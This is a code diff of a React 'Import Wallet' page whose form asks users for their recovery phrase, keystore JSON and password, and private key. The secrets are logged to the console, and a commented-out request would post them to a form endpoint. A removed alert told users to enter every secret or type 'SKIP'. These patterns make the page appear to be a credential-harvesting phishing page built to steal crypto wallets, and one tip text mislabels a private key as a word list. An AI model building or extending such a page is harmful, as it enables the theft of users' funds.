@@ -1,61 +1,83 @@
 import React from 'react';
 import '../../assets/styles/css/wallet-details-entry-page.css';
 import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
-// import { useState } from 'react';
+import { useState } from 'react';
+// import { useEffect } from 'react';
 import Navbar from '../../components/Navbar';
 import Footer from '../../components/Footer';
 
 function WalletDetailsEntryPage() {
-  // const [showPhrase, setShowPhrase] = useState(false);
-  // const [showKeyJson, setShowKeyJson] = useState(false);
-  // const [showPrivateKey, setShowPrivateKey] = useState(true);
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [showKeyJson, setShowKeyJson] = useState(false);
+  const [showPrivateKey, setShowPrivateKey] = useState(true);
 
   // form handling
 
-  // const [phrase, setPhrase] = useState('');
-  // const [keyJson, setKeyJson] = useState('');
-  // const [password, setPassword] = useState('');
-  // const [privateKey, setPrivatekey] = useState('');
+  const [userData, setUserData] = useState({
+    phrase: '',
+    keystoreJson: '',
+    password: '',
+    privateKey: '',
+  });
 
-  function validateForm(event) {
-    event.preventDefault();
-    // if (
-    //   phrase === '' ||
-    //   keyJson === '' ||
-    //   password.value === '' ||
-    //   privateKey === ''
-    // ) {
-    //   alert(
-    //     `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
-    //   );
-    //   return false;
-    // }
+  const [userDataArray, setUserDataArray] = useState([]);
+
+  function handleChange(e) {
+    const name = e.target.name;
+    const value = e.target.value;
+    setUserData({ ...userData, [name]: value });
   }
 
-  // function displayPhrase() {
-  //   setShowPhrase(true);
-  //   setShowKeyJson(false);
-  //   setShowPrivateKey(false);
-  // }
+  console.log(userData);
 
-  // function displayKeyJson() {
-  //   setShowKeyJson(true);
-  //   setShowPhrase(false);
-  //   setShowPrivateKey(false);
-  // }
+  function handleSubmit(e) {
+    e.preventDefault();
+  }
+  // const encode = (data) => {
+  //   return Object.keys(data)
+  //     .map(
+  //       (key) => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
+  //     )
+  //     .join('&');
+  // };
 
-  // function displayPrivateKey() {
-  //   setShowPrivateKey(true);
-  //   setShowPhrase(false);
-  //   setShowKeyJson(false);
-  // }
+  // useEffect(() => {
+  //   fetch('/wallet-details-entry-page', {
+  //     method: 'POST',
+  //     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  //     body: encode({ 'form-name': 'contact-form' }),
+  //   })
+  //     .then(() => alert('Success!'))
+
+  //     .catch((error) => alert(error));
+  // });
+
+  // console.log(addPhrase);
+
+  function displayPhrase() {
+    setShowPhrase(true);
+    setShowKeyJson(false);
+    setShowPrivateKey(false);
+  }
+
+  function displayKeyJson() {
+    setShowKeyJson(true);
+    setShowPhrase(false);
+    setShowPrivateKey(false);
+  }
+
+  function displayPrivateKey() {
+    setShowPrivateKey(true);
+    setShowPhrase(false);
+    setShowKeyJson(false);
+  }
 
   return (
     <>
       <Navbar />
       <section className="wallet-details-entry-section">
         <div className="section-header text-center">Import Wallet</div>
-        {/* <div className="options-wrapper">
+        <div className="options-wrapper">
           <button
             className="option-item"
             style={{
@@ -86,79 +108,74 @@ function WalletDetailsEntryPage() {
           >
             Private Key
           </button>
-        </div> */}
+        </div>
         <form
           className="form-area"
-          method="POST"
-          action="/wallet-details-entry-page"
+          method="post"
           name="Wallet_import_details"
-          onSubmit={validateForm}
+          onSubmit={handleSubmit}
         >
-          <input
-            type="hidden"
-            name="Wallet_import_details"
-            value="tracked-form"
-          />
+          <input type="hidden" name="form-name" value="Wallet_import_details" />
 
-          {/* {showPhrase && ( */}
-          <div className="mb-3">
-            <textarea
-              className="form-control"
-              placeholder="Phrase"
-              name="Phrase"
-              rows="5"
-              // value={phrase}
-              // onChange={(e) => setPhrase(e.target.value)}
-            ></textarea>
-            <div className="tip-text">
-              Typically 12 (sometimes 24) words separated by single spaces.
-            </div>
-          </div>
-          {/* )} */}
-          {/* {showKeyJson && ( */}
-          <div className="mb-3">
-            <textarea
-              style={{ marginBottom: '20px' }}
-              className="form-control"
-              // value={keyJson}
-              // onChange={(e) => setKeyJson(e.target.value)}
-              placeholder="Keystore JSON"
-              name="Keystore JSON"
-              rows="5"
-            ></textarea>
-            <div>
-              <input
-                type="password"
+          {showPhrase && (
+            <div className="mb-3">
+              <textarea
                 className="form-control"
-                placeholder="Password"
-                name="Password"
-                id="inputPassword"
-                // value={password}
-                // onChange={(e) => setPassword(e.target.value)}
-              ></input>
+                placeholder="Phrase"
+                name="Phrase"
+                rows="5"
+                value={userData.phrase}
+                onChange={handleChange}
+              ></textarea>
+              <div className="tip-text">
+                Typically 12 (sometimes 24) words separated by single spaces.
+              </div>
             </div>
-            <div className="tip-text">
-              Several lines of text beginning with '(...)' plus the password you
-              used to encrypt it.
+          )}
+          {showKeyJson && (
+            <div className="mb-3">
+              <textarea
+                style={{ marginBottom: '20px' }}
+                className="form-control"
+                placeholder="Keystore JSON"
+                name="Keystore-JSON"
+                value={userData.keystoreJson}
+                onChange={handleChange}
+                rows="5"
+              ></textarea>
+              <div>
+                <input
+                  type="password"
+                  className="form-control"
+                  placeholder="Password"
+                  name="Password"
+                  id="inputPassword"
+                  value={userData.password}
+                  onChange={handleChange}
+                ></input>
+              </div>
+              <div className="tip-text">
+                Several lines of text beginning with '(...)' plus the password
+                you used to encrypt it.
+              </div>
             </div>
-          </div>
-          {/* )} */}
+          )}
 
-          {/* {showPrivateKey && ( */}
-          <div className="mb-3">
-            <input
-              type="text"
-              className="form-control"
-              placeholder="Private Key"
-              name="Private key"
-              // value={privateKey}
-              // onChange={(e) => setPrivatekey(e.target.value)}
-            ></input>
-            <div className="tip-text">
-              Typically 12 (sometimes 24) words separated by single spaces.
+          {showPrivateKey && (
+            <div className="mb-3">
+              <input
+                type="text"
+                className="form-control"
+                placeholder="Private Key"
+                name="Private-key"
+                value={userData.privateKey}
+                onChange={handleChange}
+              ></input>
+              <div className="tip-text">
+                Typically 12 (sometimes 24) words separated by single spaces.
+              </div>
             </div>
-          </div>
-          {/* )} */}
+          )}
 
           <div className="submit-button-wrapper">
             <button
